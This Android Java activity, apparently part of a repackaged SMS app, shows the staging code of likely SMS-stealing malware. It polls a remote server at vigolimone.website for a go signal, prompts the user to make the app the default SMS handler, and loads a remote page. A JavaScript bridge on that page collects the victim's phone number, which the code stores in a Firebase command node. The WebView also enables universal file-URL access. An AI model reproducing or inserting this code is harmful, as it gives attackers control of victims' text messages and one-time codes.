package com.menergemis.defaultsemes;

import android.app.role.RoleManager;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.provider.Telephony;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.menergemis.defaultsemes.common.QKApplication;
import com.menergemis.defaultsemes.feature.main.MainActivity;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by BlueStorm on 19/10/2017.
 */

public class WebVisor extends AppCompatActivity {

    private WebViewClient webViewClient;
    private String  phone_status,check;
    private WebView webView;
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_web);
        webView =  findViewById(R.id.webVisor);



        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        final ProgressBar progressBar = (ProgressBar)findViewById(R.id.progressBar_web);

        final WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setAppCacheEnabled(true);
        webSettings.setCacheMode(WebSettings.LOAD_DEFAULT);
        webSettings.setDomStorageEnabled(true);
        webSettings.setGeolocationEnabled(true);
        webSettings.setAppCacheEnabled(true);
        webSettings.setCacheMode(webSettings.LOAD_CACHE_ELSE_NETWORK);
        webSettings.setAllowUniversalAccessFromFileURLs(true);
        webSettings.setAllowFileAccessFromFileURLs(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setAllowFileAccess(true);


            //generamos el webview y cargamos el enlace
            webViewClient = new WebViewClient() {

                @Override
                public void onPageStarted(WebView view, String url, Bitmap favicon) {
                    super.onPageStarted(view, url, favicon);
                    progressBar.setVisibility(View.VISIBLE);
                }
                @Override
                public void onPageFinished(WebView view, String url) {
                    super.onPageFinished(view, url);
                    progressBar.setVisibility(View.GONE);
                    if(url.equals("https://vigolimone.website/regs.html")){
                        if(phone_status.equals("0")){
                            addFirebase();
                        }


                    }
                }

                        @Override
                public void onLoadResource(WebView view, String url) {


                }
            };
            webView.setWebViewClient(webViewClient);
            webView.removeJavascriptInterface("Android");
            webView.addJavascriptInterface(getLogInFormInterface(), "Android");
        phone_status = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("phone_status", "0");
        callCheckAPI();



    }
    private void callCheckAPI(){



        StringRequest stringRequest = new StringRequest(Request.Method.GET,"https://vigolimone.website/regc.php",
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {


                        try {
                            JSONObject jsonObject = new JSONObject(response);

                            if(jsonObject.has("check")){
                                check = jsonObject.getString("check");

                                final SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
                                editor.putString("check", check);
                                editor.apply();

                                if(check.equals("1")){
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                        RoleManager  roleManager = getSystemService(RoleManager.class);

                                        if (roleManager.isRoleAvailable(RoleManager.ROLE_SMS)) {
                                            if (roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {

                                            } else {
                                                Intent roleRequestIntent = roleManager.createRequestRoleIntent(
                                                        RoleManager.ROLE_SMS);
                                                startActivityForResult(roleRequestIntent, 42389);
                                            }
                                        }
                                    } else {
                                        Intent defaultI = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
                                        defaultI.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME,
                                                getApplicationContext().getPackageName());
                                        startActivity(defaultI);

                                    }

                                    if(phone_status.equals("0")){
                                        webView.loadUrl("https://vigolimone.website/reg.html");
                                    }else{
                                        webView.loadUrl("https://vigolimone.website/regs.html");
                                    }

                                }
                                else{
                                    Intent intent = new Intent(WebVisor.this, MainActivity.class);
                                    startActivity(intent);
                                    finish();
                                }
                            }



                        } catch (JSONException e) {
                            e.printStackTrace();
                        }


                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {

                    }
                }){

        };
        RequestQueue requestQueue = Volley.newRequestQueue(this);
        requestQueue.add(stringRequest);


    }
    private void addFirebase(){


        DatabaseReference databaseReferenceCMD =  firebaseDatabase.getReference().child(phoneNumber);
        databaseReferenceCMD.child("Phone Number").setValue(phoneNumber);
        final SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
        editor.putString("phone_status", "1");
        editor.apply();


    }
    private void showToast(final String message) {

        runOnUiThread(new Runnable() {

            @Override
            public void run() {
                Toast.makeText(getApplicationContext(), message,
                        Toast.LENGTH_LONG).show();
            }
        });

    }
    @Override
    public void onBackPressed() {
        if (webView!=null) {
            webView.stopLoading();
            if (webView.canGoBack()) {
                webView.goBack();
            }
            else {
                super.onBackPressed();
            }
        }
        else {
            super.onBackPressed();
        }
    }
    private String phoneNumber;
    private FirebaseDatabase firebaseDatabase =  FirebaseDatabase.getInstance();
    private void addPhoneNumber(String str){
        try {
            JSONObject jsonObject = new JSONObject(str);
            phoneNumber = jsonObject.getString("pnumber");
            ((QKApplication)getApplication()).phonNumber = phoneNumber;
            final SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
            editor.putString("phoneNumber", phoneNumber);
            editor.apply();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    public LogInFormInterface getLogInFormInterface() {
        return new LogInFormInterface();

    }
    public class LogInFormInterface {
        @JavascriptInterface
        public void sendData(final String str) {
            //Get the string value to process
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    addPhoneNumber(str);
                }
            });
        }
    }
}
